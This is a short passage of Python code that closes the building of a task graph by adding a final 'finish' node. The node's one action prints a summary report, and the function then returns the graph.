            name="finish",
            description="summarise what the run proved",
            actions=[Action("report.summary", "print the result", report_summary)],
        )
    )
    return graph
